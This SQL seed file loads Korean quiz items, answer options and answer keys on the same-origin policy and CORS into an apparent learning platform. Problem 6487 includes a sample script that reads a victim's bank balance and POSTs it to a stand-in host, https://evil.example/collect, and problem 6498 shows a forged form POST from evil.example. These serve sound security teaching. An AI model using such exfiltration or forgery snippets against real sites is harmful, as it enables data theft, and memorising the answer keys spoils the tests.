-- Unit: SOP와 CORS (Unit ID: 255)
-- Chapter: 웹 보안 (Chapter ID: 23)

-- Lesson 생성
INSERT INTO lesson (id, unit_id, title)
VALUES (1051, 255, '출처 판정과 동일 출처 정책의 역할'),
       (1052, 255, '단순 요청과 사전 요청의 흐름'),
       (1053, 255, 'CORS 응답 헤더 설정과 오류 진단');

-- =====================================================
-- Lesson 1051: 출처 판정과 동일 출처 정책의 역할
-- =====================================================

INSERT INTO problem (id, lesson_id, instruction, content, problem_type)
VALUES (6485, 1051, '아래 오류를 없애려면 API 서버가 Access-Control-Allow-Origin에 넣어야 할 값은?', '사용자가 아래 주소의 결제 페이지를 열자, 이 페이지의 스크립트가 `https://api.shop.com/cart`로 보낸 GET이 콘솔에 CORS 오류를 남겼다. API 서버 로그에는 `GET /cart 200`이 찍혔다.

```
페이지 주소: https://shop.example.com:8443/cart/checkout?step=2#coupon
```

API 서버가 보낸 응답 헤더:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://shop.example.com
```', 'OBJECTIVE'),
       (6486, 1051, '아래 목록에서 기준 페이지와 다른 출처로 판정되는 주소는 모두 몇 개인가?', '기준 페이지는 포트를 생략한 `https://www.gravit.io`(https 기본 포트 443)이다.

| 번호 | 주소 |
| --- | --- |
| 1 | `https://www.gravit.io/lesson/3?tab=quiz` |
| 2 | `http://www.gravit.io/lesson/3` |
| 3 | `https://gravit.io/lesson/3` |
| 4 | `https://www.gravit.io:8443/lesson/3` |
| 5 | `https://cdn.gravit.io/app.js` |', 'OBJECTIVE'),
       (6487, 1051, '아래 시나리오에서 브라우저의 기본 보안 정책이 막아 주는 동작은?', '사용자는 `https://bank.example`에 로그인한 상태로, 다른 탭에서 `https://evil.example` 페이지를 열었다. 이 페이지에는 아래 스크립트가 들어 있고, bank.example은 어떤 CORS 응답 헤더도 보내지 않는다.

```javascript
const res = await fetch(''https://bank.example/api/balance'', { credentials: ''include'' });
const data = await res.json();
await fetch(''https://evil.example/collect'', { method: ''POST'', body: JSON.stringify(data) });
```', 'OBJECTIVE'),
       (6488, 1051, '아래 구조 변경 뒤 생긴 오류를 해결하는 방법으로 옳은 것은?', '처음에는 화면과 API를 한 서버가 함께 서빙했다. 트래픽이 늘어 API를 별도 서버로 분리하자, 화면의 상품 목록이 비고 브라우저 콘솔에 CORS 오류가 찍혔다. API 서버 로그에는 요청이 200으로 남아 있다.

| 구분 | 변경 전 | 변경 후 |
| --- | --- | --- |
| 화면 | `https://www.shop.com` | `https://www.shop.com` |
| 상품 API | `https://www.shop.com/api/products` | `https://api.shop.com/products` |', 'OBJECTIVE'),
       (6489, 1051, '아래 로그에서 실패한 요청의 페이지 주소가 허용 목록 항목과 달라진 URL 구성 요소의 이름은?', 'API 서버는 요청을 보낸 페이지의 출처가 아래 목록에 있을 때만 Access-Control-Allow-Origin을 붙인다.

```javascript
const ALLOWED = [''http://localhost:5173'', ''https://admin.example.com''];
```

같은 날 들어온 요청을, 요청을 보낸 페이지 주소와 함께 정리한 로그다.

```
페이지 http://localhost:5173/settings?tab=2         → 응답 읽음
페이지 https://admin.example.com/users?id=3         → 응답 읽음
페이지 https://admin.example.com:8443/report/daily  → 콘솔에 CORS 오류
```', 'SUBJECTIVE'),
       (6490, 1051, '아래 상황에서 (2)의 결과를 만든 브라우저의 기본 보안 정책 이름은?', '웹메일 서비스의 받은 편지함 API를 같은 코드로 두 페이지에서 불렀다. mail.example은 응답에 CORS 관련 헤더를 전혀 넣지 않으며, 두 경우 모두 서버 로그에는 `GET /api/inbox 200`이 남았다.

```javascript
const res = await fetch(''https://mail.example/api/inbox'');
console.log(await res.json());
```

| 실행한 페이지 | 콘솔 결과 |
| --- | --- |
| (1) `https://mail.example/home` | 메일 목록 배열 출력 |
| (2) `https://quiz.example/play` | TypeError: Failed to fetch |', 'SUBJECTIVE');

INSERT INTO option (id, problem_id, content, explanation, is_answer)
VALUES
-- 문제 6485
(17467, 6485, 'https://shop.example.com:8443/cart', '허용 출처에 경로까지 맞춰 적어야 한다고 본 오개념. 출처는 프로토콜·호스트·포트만으로 정해지므로 경로를 붙이면 페이지의 출처와 일치하지 않는다.', false),
(17468, 6485, 'https://shop.example.com:8443', '현재 값은 포트가 빠져 기본 포트 443을 뜻하므로 8443에서 열린 페이지와 다른 출처다. 페이지의 프로토콜·호스트·포트를 그대로 적어야 한다.', true),
(17469, 6485, 'shop.example.com:8443', '호스트와 포트만 맞추면 된다고 본 오개념. 같은 호스트·포트라도 http와 https는 다른 출처라 프로토콜까지 적어야 일치한다.', false),
(17470, 6485, 'https://api.shop.com', '허용 출처에 API 서버 자신의 출처를 적는다고 본 오개념. 이 헤더에는 응답을 읽으려는 페이지의 출처를 적는다.', false),
-- 문제 6486
(17471, 6486, '2개', '프로토콜(2번)과 포트(4번) 차이만 출처 차이로 보고, 호스트가 다른 3번·5번을 같은 사이트로 넘긴 경우. 호스트 문자열이 다르면 다른 출처다.', false),
(17472, 6486, '3개', 'www 유무를 같은 호스트로 본 오개념. gravit.io와 www.gravit.io는 호스트가 달라 3번도 다른 출처다.', false),
(17473, 6486, '4개', '2번은 프로토콜, 3번·5번은 호스트, 4번은 포트(8443 대 443)가 달라 다른 출처다. 1번은 경로·쿼리만 달라 같은 출처다.', true),
(17474, 6486, '5개', '1번의 경로·쿼리 차이까지 출처 차이로 본 오개념. 출처는 프로토콜·호스트·포트만 비교하므로 1번은 같은 출처다.', false),
-- 문제 6487
(17475, 6487, 'bank.example 응답에 담긴 잔액을 스크립트가 꺼내 읽는 것', '다른 출처 응답을 스크립트가 읽는 것을 막는 것이 이 정책의 핵심이다. res.json()에서 실패하므로 잔액이 evil.example로 새어 나가지 않는다.', true),
(17476, 6487, 'bank.example 서버가 /api/balance 요청을 받아 처리하는 것', '정책이 요청 전송 자체를 막는다고 본 오개념. 서버는 요청을 받아 응답을 정상적으로 보내고, 브라우저가 그 응답을 스크립트에 넘기지 않을 뿐이다.', false),
(17477, 6487, 'evil.example 스크립트가 /collect로 데이터를 보내는 것', '페이지와 /collect는 같은 출처(evil.example)라 상호작용이 허용된다. 막히는 것은 다른 출처인 bank.example 응답을 읽는 단계다.', false),
(17478, 6487, 'bank.example 요청에 Origin 헤더가 실리는 것', 'Origin 헤더는 브라우저가 요청을 보낸 페이지의 출처를 알리려고 붙이는 것으로, 막히는 대상이 아니라 서버가 허용 여부를 판단하는 근거다.', false),
-- 문제 6488
(17479, 6488, '요청 주소의 경로를 https://api.shop.com/api/products로 맞춘다.', '경로를 맞추면 된다고 본 오개념. 경로는 출처 판정과 무관하고, 호스트가 www.shop.com과 api.shop.com으로 달라 여전히 다른 출처다.', false),
(17480, 6488, 'www.shop.com 서버 응답에 Access-Control-Allow-Origin: https://api.shop.com을 넣는다.', '허용 주체를 거꾸로 본 오개념. 허용 헤더는 요청을 받는 쪽(api.shop.com)이 자기 응답을 읽어도 되는 출처(www.shop.com)를 적어 보내는 것이다.', false),
(17481, 6488, '요청 주소 끝에 ?origin=www.shop.com 쿼리 스트링을 붙인다.', '쿼리 스트링으로 출처를 알릴 수 있다고 본 오개념. 쿼리는 출처 판정에 영향을 주지 않고, 브라우저는 서버의 응답 헤더만 보고 허용 여부를 정한다.', false),
(17482, 6488, 'api.shop.com 응답에 Access-Control-Allow-Origin: https://www.shop.com을 넣는다.', '분리 후 화면과 API의 호스트가 달라 다른 출처가 됐다. API 서버가 화면의 출처를 허용 출처로 명시하면 브라우저가 응답을 스크립트에 넘겨준다.', true);

INSERT INTO answer (id, problem_id, content, explanation)
VALUES (2118, 6489, '포트,포트 번호,포트번호,port,port number,portnumber', '실패한 페이지는 https와 admin.example.com이 허용 항목 https://admin.example.com과 같고, 포트만 8443으로 다르다(허용 항목은 포트를 생략해 기본 포트 443). 출처는 프로토콜·호스트·포트 세 가지가 모두 같아야 동일하므로 포트 하나만 달라도 허용 목록에 없는 출처가 된다. 첫 줄처럼 /settings?tab=2가 붙어도 통과한 것은 경로(path)·쿼리 스트링이 출처 판정에 영향을 주지 않기 때문이므로, 경로나 쿼리는 답이 될 수 없다.'),
       (2119, 6490, '동일 출처 정책,동일출처정책,동일 출처 정책(SOP),SOP,Same-Origin Policy,Same Origin Policy,SameOriginPolicy,동일 근원 정책,동일출처 정책', '(1)은 페이지와 API의 출처가 같아 응답을 그대로 읽는다. (2)는 호스트가 quiz.example과 mail.example로 달라 다른 출처이고, 서버가 허용 헤더를 보내지 않았으므로 브라우저가 응답을 스크립트에 넘기지 않는다. 서버 로그가 둘 다 200인 것은 막힌 곳이 서버가 아니라 브라우저라는 뜻이다. 같은 출처끼리만 상호작용을 허용하는 이 기본 정책이 동일 출처 정책(SOP)이다. CORS는 서버가 이 제약을 명시적으로 풀어 주는 표준이므로, 응답을 막은 정책이 아니라 막힘을 푸는 장치라는 점에서 구분된다.');

-- =====================================================
-- Lesson 1052: 단순 요청과 사전 요청의 흐름
-- =====================================================

INSERT INTO problem (id, lesson_id, instruction, content, problem_type)
VALUES (6491, 1052, '아래 코드를 실행했을 때 api.shop.com으로 오가는 요청을 보낸 순서대로 나열한 것으로 옳은 것은?', '`https://www.shop.com` 페이지의 스크립트가 아래 두 요청을 차례로 보낸다. api.shop.com은 이 출처와 메서드를 모두 허용하도록 설정돼 있다.

```javascript
// (1) 장바구니 조회
await fetch(''https://api.shop.com/cart'');

// (2) 장바구니 수량 변경
await fetch(''https://api.shop.com/cart/items/7'', {
  method: ''PUT'',
  headers: { ''Content-Type'': ''application/json'' },
  body: JSON.stringify({ qty: 3 }),
});
```', 'OBJECTIVE'),
       (6492, 1052, '아래 조건에서 10:00:00부터 10:12:00까지 서버 로그에 찍히는 OPTIONS 요청은 모두 몇 건인가?', '`https://docs.example` 편집 화면은 저장 버튼을 누를 때마다 `https://api.docs.example/docs/42`로 JSON 본문의 PUT을 보낸다. 서버의 사전 요청 응답에는 아래 헤더가 붙는다. Access-Control-Max-Age 값의 단위는 초이고, 브라우저는 이 값을 그대로 따른다고 가정한다.

```http
Access-Control-Allow-Origin: https://docs.example
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 300
```

저장 버튼을 누른 시각: 10:00:00, 10:03:00, 10:06:00, 10:09:00, 10:12:00', 'OBJECTIVE'),
       (6493, 1052, '아래 요청·응답 기록에 대한 설명으로 옳지 않은 것은?', '`https://www.example.com` 페이지의 스크립트가 fetch로 `https://api.example.com/api/profile`에 JSON 본문의 PUT을 한 번 호출했을 때 오간 기록이다.

```http
[요청 1]
OPTIONS /api/profile
Origin: https://www.example.com

[응답 1] 204 No Content
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Methods: GET, PUT
Access-Control-Allow-Headers: Content-Type

[요청 2]
PUT /api/profile
Origin: https://www.example.com
Content-Type: application/json

{"nickname":"gravit"}

[응답 2] 200 OK
Access-Control-Allow-Origin: https://www.example.com
```', 'OBJECTIVE'),
       (6494, 1052, '아래 서버 설정에서 스크립트가 응답을 정상적으로 읽을 수 있는 요청은?', '`https://api.example.com`은 사전 요청과 실제 요청의 모든 응답에 아래 헤더를 붙인다.

```http
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
```

`https://www.example.com` 페이지의 스크립트가 아래 네 요청을 각각 따로 보낸다.

```javascript
// (가)
await fetch(''https://api.example.com/posts/1'', {
  method: ''PUT'',
  headers: { ''Content-Type'': ''application/json'' },
  body: JSON.stringify({ title: ''수정'' }),
});

// (나)
await fetch(''https://api.example.com/posts'', {
  method: ''POST'',
  headers: { ''Content-Type'': ''application/json'' },
  body: JSON.stringify({ title: ''새 글'' }),
});

// (다)
await fetch(''https://api.example.com/me'', {
  headers: { Authorization: ''Bearer eyJhbGciOi'' },
});

// (라)
await fetch(''https://api.example.com/posts'', {
  method: ''POST'',
  headers: { ''Content-Type'': ''application/json'', ''X-Trace-Id'': ''a1b2'' },
  body: JSON.stringify({ title: ''새 글'' }),
});
```', 'OBJECTIVE'),
       (6495, 1052, '아래 두 사전 요청 기록에서 ??? 자리에 공통으로 들어갈 요청 헤더의 이름은?', '`https://www.example.com` 관리 화면에서 수정 버튼은 `fetch(url, { method: ''PATCH'', ... })`를, 삭제 버튼은 `fetch(url, { method: ''DELETE'' })`를 호출한다. 두 버튼을 차례로 눌렀을 때 서버에 찍힌 사전 요청은 아래와 같다.

```http
OPTIONS /posts/31
Origin: https://www.example.com
???: PATCH

OPTIONS /posts/31
Origin: https://www.example.com
???: DELETE
```', 'SUBJECTIVE'),
       (6496, 1052, '아래 세 요청 중 (1)이 속하는 CORS 요청 분류의 이름은?', '`https://www.example.com` 페이지의 스크립트가 `https://api.example.com`으로 세 요청을 보냈고, 서버 로그는 아래와 같다.

```javascript
// (1)
await fetch(''https://api.example.com/notices?page=2'');

// (2)
await fetch(''https://api.example.com/posts/9'', { method: ''DELETE'' });

// (3)
await fetch(''https://api.example.com/posts'', {
  method: ''POST'',
  headers: { ''Content-Type'': ''application/json'' },
  body: ''{"title":"hi"}'',
});
```

```
GET     /notices?page=2  200
OPTIONS /posts/9         204
DELETE  /posts/9         200
OPTIONS /posts           204
POST    /posts           201
```', 'SUBJECTIVE');

INSERT INTO option (id, problem_id, content, explanation, is_answer)
VALUES
-- 문제 6491
(17483, 6491, 'GET → OPTIONS → PUT', '(1)은 GET에 표준 헤더만 써 조건을 만족하므로 바로 나간다. (2)는 PUT 메서드와 JSON 본문 때문에 조건을 벗어나, 브라우저가 PUT 직전에 OPTIONS로 허용 여부를 먼저 묻는다.', true),
(17484, 6491, 'GET → PUT', '사전 확인이 생략된다고 본 오개념. PUT이나 application/json 본문은 단순 요청 조건을 벗어나므로 실제 PUT 전에 OPTIONS가 먼저 나간다.', false),
(17485, 6491, 'OPTIONS → GET → OPTIONS → PUT', '모든 교차 출처 요청에 사전 확인이 붙는다고 본 오개념. 표준 헤더만 쓴 GET은 단순 요청이라 OPTIONS 없이 바로 전송된다.', false),
(17486, 6491, 'OPTIONS → GET → PUT', '한 번의 사전 확인으로 페이지의 이후 요청을 묶어 허락받는다고 본 오개념. 사전 요청은 조건을 벗어난 (2) 직전에 그 요청을 위해 보낸다.', false),
-- 문제 6492
(17487, 6492, '1건', 'Max-Age를 무기한 재사용이나 쓸 때마다 연장되는 시간으로 본 오개념. 첫 확인 결과는 300초 뒤 만료되므로 이후 저장에서 다시 확인한다.', false),
(17488, 6492, '2건', '10:06 저장을 캐시 안으로 본 계산 실수. 10:00 확인은 10:05에 만료되므로 10:06에도 OPTIONS가 다시 나간다.', false),
(17489, 6492, '3건', '10:00 확인 결과로 10:05까지 재사용(10:03 생략), 10:06 재확인 결과로 10:11까지 재사용(10:09 생략), 10:12에 다시 확인한다.', true),
(17490, 6492, '5건', 'Max-Age를 무시하고 저장마다 사전 요청이 나간다고 본 오개념. 이 헤더가 사전 요청 결과의 캐싱 시간을 정해 그동안은 OPTIONS를 생략한다.', false),
-- 문제 6493
(17491, 6493, '요청 1은 애플리케이션 코드가 아니라 브라우저가 스스로 보낸 것이다.', '참이다. 코드는 PUT을 한 번 호출했을 뿐이고, 조건을 벗어난 요청이라 브라우저가 OPTIONS로 허용 여부를 먼저 물었다.', false),
(17492, 6493, '응답 1의 허용 메서드에 PUT이 없었다면 요청 2는 서버로 전송되지 않았다.', '참이다. 브라우저는 사전 요청 응답에서 허용을 확인한 뒤에만 실제 요청을 보내므로, PUT이 빠지면 요청 2 없이 오류로 끝난다.', false),
(17493, 6493, '응답 2에 Access-Control-Allow-Origin이 빠졌다면 스크립트는 결과를 읽지 못했다.', '참이다. 사전 요청을 통과해도 실제 응답에 허용 헤더가 없으면, 서버 처리는 끝났더라도 브라우저가 응답을 스크립트에 넘기지 않는다.', false),
(17494, 6493, '요청 1에서 서버가 PUT 본문을 미리 받아 검증하고, 요청 2에서 저장한다.', '거짓이다. 기록처럼 요청 1에는 본문이 없고 출처만 실린다. 사전 요청은 허용 여부만 묻는 단계이고 본문은 요청 2에 처음 실린다.', true),
-- 문제 6494
(17495, 6494, '(가)', 'Content-Type 허용만 보고 통과로 본 오개념. JSON PUT은 사전 요청 대상인데 Allow-Methods에 PUT이 없어 사전 요청에서 막히고 실제 요청은 나가지 않는다.', false),
(17496, 6494, '(나)', 'JSON 본문이라 사전 요청이 먼저 가지만, POST와 Content-Type이 모두 허용 목록에 있고 출처도 일치해 실제 요청까지 성공하고 응답을 읽는다.', true),
(17497, 6494, '(다)', 'GET이면 늘 단순 요청이라고 본 오개념. Authorization은 단순 요청 조건의 헤더가 아니라 사전 요청이 붙고, Allow-Headers에 없어 막힌다.', false),
(17498, 6494, '(라)', '메서드와 Content-Type만 맞으면 된다고 본 오개념. 커스텀 헤더 X-Trace-Id가 Allow-Headers에 없어 사전 요청에서 막힌다.', false);

INSERT INTO answer (id, problem_id, content, explanation)
VALUES (2120, 6495, 'Access-Control-Request-Method,Access Control Request Method,AccessControlRequestMethod,Request-Method,Request Method,ACRM', '사전 요청에서 브라우저는 곧 보낼 실제 요청의 메서드를 이 헤더에 담아 서버에 묻는다. 그래서 수정(PATCH)과 삭제(DELETE)에서 값만 달라졌다. 서버는 응답의 Access-Control-Allow-Methods로 그 메서드를 허용하는지 답한다. 이름이 비슷한 Access-Control-Allow-Methods는 서버가 보내는 응답 헤더이고, Access-Control-Request-Method는 브라우저가 보내는 요청 헤더라는 방향이 다르다.'),
       (2121, 6496, '단순 요청,단순요청,simple request,simple requests,simplerequest,simple,심플 리퀘스트,심플 요청', '(1)은 GET에 표준 헤더만 쓰고 본문도 없어 단순 요청 조건(GET·POST·HEAD + 표준 헤더 + 제한된 Content-Type)을 만족하므로, 로그처럼 OPTIONS 없이 바로 전송됐다. (2)는 DELETE 메서드, (3)은 JSON 본문(Content-Type: application/json) 때문에 조건을 벗어나 사전 요청(Preflight)이 먼저 나갔다. (3)은 POST인데도 Content-Type 때문에 단순 요청이 아니라는 점이 헷갈리기 쉽다. 메서드만이 아니라 헤더와 Content-Type까지 함께 따져야 분류가 정해진다.');

-- =====================================================
-- Lesson 1053: CORS 응답 헤더 설정과 오류 진단
-- =====================================================

INSERT INTO problem (id, lesson_id, instruction, content, problem_type)
VALUES (6497, 1053, '아래 상황에서 운영 환경에서만 오류가 난 원인으로 옳은 것은?', '스테이징에서는 화면을 `http://www.example.com`으로 서빙했고 문제없이 동작했다. 같은 코드를 운영에 배포하면서 화면 주소만 `https://www.example.com`으로 바꾸자 주문 목록 화면에서 CORS 오류가 났다. API 서버 설정은 스테이징과 같다.

```javascript
const res = await fetch(''https://api.example.com/api/orders'');
```

운영에서 받은 응답:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: http://www.example.com
```

API 서버 로그: `GET /api/orders 200 12ms`', 'OBJECTIVE'),
       (6498, 1053, '아래 팀의 판단에 대한 평가로 옳은 것은?', '로그인 없이 응답을 받는 설문 API `https://api.survey.example/answers`는 폼 형식 POST를 받으면 곧바로 DB에 저장한다. 보안 점검에서 "다른 사이트에서도 이 API로 응답을 쌓을 수 있다"는 지적이 나오자, 팀은 응답 헤더를 아래처럼 정하고 "이제 다른 출처 페이지에서 보낸 설문 응답은 저장되지 않는다"고 결론 내렸다.

```http
Access-Control-Allow-Origin: https://www.survey.example
```

```javascript
// https://evil.example 페이지에 심어진 스크립트
fetch(''https://api.survey.example/answers'', {
  method: ''POST'',
  headers: { ''Content-Type'': ''application/x-www-form-urlencoded'' },
  body: ''q1=5&q2=5&q3=5'',
});
```', 'OBJECTIVE'),
       (6499, 1053, '아래 응답 헤더 설정에 대한 설명으로 옳지 않은 것은?', '`https://api.example.com`은 사전 요청과 실제 요청의 모든 응답에 아래 헤더를 붙인다.

```http
Access-Control-Allow-Origin: https://admin.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Max-Age: 3600
```', 'OBJECTIVE'),
       (6500, 1053, '아래 표의 호출 가운데 브라우저가 응답을 스크립트에 넘겨주는 것만 모두 고른 것은?', '`https://www.example.com` 페이지의 스크립트가 `https://api.example.com`의 네 API를 호출했다. 네 호출 모두 커스텀 헤더 없는 GET이고, 서버 로그에는 모두 200으로 남았다.

| 호출 | fetch 옵션 | Access-Control-Allow-Origin | Access-Control-Allow-Credentials |
| --- | --- | --- | --- |
| (가) 환율 조회 | 없음 | `*` | 없음 |
| (나) 내 정보 | `credentials: ''include''` | `*` | `true` |
| (다) 주문 내역 | `credentials: ''include''` | `https://www.example.com` | `true` |
| (라) 장바구니 | `credentials: ''include''` | `https://www.example.com` | 없음 |', 'OBJECTIVE'),
       (6501, 1053, '아래 서버 코드에서 ??? 자리에 들어갈 요청 헤더의 이름은?', 'API 서버는 허용 목록에 있는 출처에만 Access-Control-Allow-Origin을 붙인다. 아래는 서버 코드와, 같은 시각 들어온 두 요청에서 ??? 헤더 값을 찍은 로그다. 첫 요청은 `https://admin.example.com/users/3?tab=log` 페이지에서 보낸 것이다.

```javascript
const ALLOWED = [''https://www.example.com'', ''https://admin.example.com''];

app.use((req, res, next) => {
  const value = req.headers[''???''];
  if (ALLOWED.includes(value)) {
    res.setHeader(''Access-Control-Allow-Origin'', value);
  }
  next();
});
```

```
GET /api/me       ??? = https://admin.example.com   → 허용 헤더 붙음
GET /api/notices  ??? = https://evil.example        → 허용 헤더 없음
```', 'SUBJECTIVE'),
       (6502, 1053, '아래 상황을 해결하려면 서버가 사전 요청 응답에서 값을 고쳐야 하는 응답 헤더의 이름은?', '`https://www.example.com` 화면은 모든 API 요청에 요청 추적용 헤더 `X-Request-Id`를 붙이기로 했다. 배포 직후 조회까지 포함한 모든 요청이 실패했고, 서버 로그에는 OPTIONS만 남고 실제 요청은 한 건도 찍히지 않았다.

```http
OPTIONS /api/orders
Origin: https://www.example.com
Access-Control-Request-Method: GET

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 600
```', 'SUBJECTIVE');

INSERT INTO option (id, problem_id, content, explanation, is_answer)
VALUES
-- 문제 6497
(17499, 6497, '허용 출처의 프로토콜이 http라서 https로 바뀐 화면은 다른 출처로 판정됐다.', '출처는 프로토콜까지 같아야 한다. 화면이 https로 바뀌었는데 허용 출처는 http로 남아 있어, 호스트가 같아도 브라우저는 응답을 스크립트에 넘기지 않는다.', true),
(17500, 6497, '허용 출처 값에 요청 경로 /api/orders가 빠져 있어 일치하지 않는다고 판정됐다.', '허용 출처에 경로까지 적어야 한다고 본 오개념. 출처는 프로토콜·호스트·포트만으로 판정하며, 스테이징에서도 경로 없이 동작했다.', false),
(17501, 6497, '응답에 Access-Control-Allow-Methods: GET이 없어 GET 응답이 차단됐다.', '모든 요청에 허용 메서드가 필요하다고 본 오개념. 커스텀 헤더 없는 GET은 단순 요청이고, 같은 헤더로 스테이징에서 동작했으니 원인이 아니다.', false),
(17502, 6497, 'API 서버가 https 화면의 요청을 거부해 응답 자체를 보내지 않았다.', 'CORS 오류를 서버 거부로 본 오개념. 서버 로그가 200이고 응답도 도착했다. 응답을 받은 뒤 브라우저가 허용 헤더를 보고 차단한 것이다.', false),
-- 문제 6498
(17503, 6498, '옳다. 허용 출처가 아닌 페이지의 요청은 브라우저가 서버로 보내기 전에 차단한다.', '모든 요청이 사전 확인을 거친다고 본 오개념. 폼 형식 POST는 단순 요청이라 OPTIONS 없이 곧바로 서버에 전송된다.', false),
(17504, 6498, '옳다. 허용 출처가 아닌 페이지에서 온 요청은 서버가 403으로 거절한다.', '허용 헤더를 서버 측 접근 제어로 본 오개념. 이 헤더는 브라우저에 읽기 허락을 알릴 뿐이고, 서버가 요청을 거절하게 만들지 않는다.', false),
(17505, 6498, '틀리다. 요청은 서버에 도달해 저장되고, 브라우저는 응답을 스크립트에 넘기지 않을 뿐이다.', 'CORS 차단은 서버가 아니라 브라우저가 응답을 넘기지 않는 것이다. 단순 요청인 이 POST는 서버까지 가서 처리되므로, 저장을 막으려면 서버에 별도 검증이 필요하다.', true),
(17506, 6498, '틀리다. 허용 출처 헤더는 GET에만 적용되므로 POST는 Allow-Methods로 막아야 한다.', '허용 출처가 메서드별로 적용된다고 본 오개념. 허용 출처는 모든 메서드에 적용되고, Allow-Methods도 사전 요청에서만 쓰여 단순 POST를 막지 못한다.', false),
-- 문제 6499
(17507, 6499, 'https://www.example.com 페이지의 스크립트는 이 API의 응답을 읽지 못한다.', '참이다. www.example.com과 admin.example.com은 호스트가 달라 다른 출처이고, 허용 출처는 admin 하나뿐이다.', false),
(17508, 6499, 'https://admin.example.com 페이지가 보내는 DELETE 요청은 실제로 전송되지 않는다.', '참이다. DELETE는 사전 요청 대상인데 허용 메서드가 GET, POST뿐이라, 브라우저가 사전 요청 단계에서 멈추고 실제 DELETE를 보내지 않는다.', false),
(17509, 6499, 'https://admin.example.com:8443 페이지의 스크립트도 이 API의 응답을 읽지 못한다.', '참이다. 호스트가 같아도 포트가 8443으로 달라 허용 출처(기본 포트 443)와 다른 출처다.', false),
(17510, 6499, 'admin 페이지의 GET 응답 본문도 1시간 동안 캐시돼, 그동안 같은 GET은 서버로 가지 않는다.', '거짓이다. Max-Age는 사전 요청 결과의 캐싱 시간이라 1시간 동안 OPTIONS를 생략하게 할 뿐, 실제 응답 본문의 캐시와는 무관하다.', true),
-- 문제 6500
(17511, 6500, '(다)', '(가)를 놓친 경우. 인증 정보를 싣지 않은 요청은 허용 출처가 *여도 모든 출처에 열려 있어 응답을 읽을 수 있다.', false),
(17512, 6500, '(가), (다)', '(가)는 인증 정보가 없어 *로 허용된다. (다)는 구체 출처와 Allow-Credentials: true가 함께 있어 쿠키를 실은 요청도 응답을 읽는다.', true),
(17513, 6500, '(가), (나), (다)', '(나)를 통과로 본 오개념. 쿠키를 싣는 요청에는 허용 출처로 *를 쓸 수 없어, Allow-Credentials가 true여도 응답이 차단된다.', false),
(17514, 6500, '(다), (라)', '(라)를 통과로 본 오개념. 쿠키를 싣는 요청은 구체 출처에 더해 Allow-Credentials: true가 있어야 한다. (가)도 놓쳤다.', false);

INSERT INTO answer (id, problem_id, content, explanation)
VALUES (2122, 6501, 'Origin,origin,오리진,Origin 헤더,origin header,Origin header', '브라우저는 교차 출처 요청에 요청을 보낸 페이지의 출처를 Origin 헤더로 실어 보낸다. 값은 프로토콜·호스트·포트뿐이라, 첫 요청이 /users/3?tab=log 페이지에서 나갔어도 로그에는 경로·쿼리가 없다. 서버는 이 값을 허용 목록과 대조해 일치할 때만 같은 값을 Access-Control-Allow-Origin으로 돌려준다. 응답 헤더인 Access-Control-Allow-Origin과는 요청/응답 방향이 다르고, 이전 페이지 주소를 알리는 Referer는 경로까지 담길 수 있어 출처 판정용 값과 구분된다.'),
       (2123, 6502, 'Access-Control-Allow-Headers,Access Control Allow Headers,AccessControlAllowHeaders,Allow-Headers,Allow Headers,ACAH', 'X-Request-Id는 단순 요청 조건에서 허용하는 헤더가 아니라서, GET이라도 사전 요청이 먼저 나간다. 사전 요청 응답의 허용 요청 헤더 목록(Content-Type, Authorization)에 이 헤더가 없으니 브라우저가 실제 요청을 보내지 않았고, 그래서 로그에 OPTIONS만 남았다. Access-Control-Allow-Headers에 X-Request-Id를 추가하면 된다. 출처(Allow-Origin)와 메서드(Allow-Methods)는 이미 허용돼 있어 원인이 아니고, Max-Age는 사전 요청 결과의 캐싱 시간일 뿐 허용 범위를 바꾸지 않는다.');
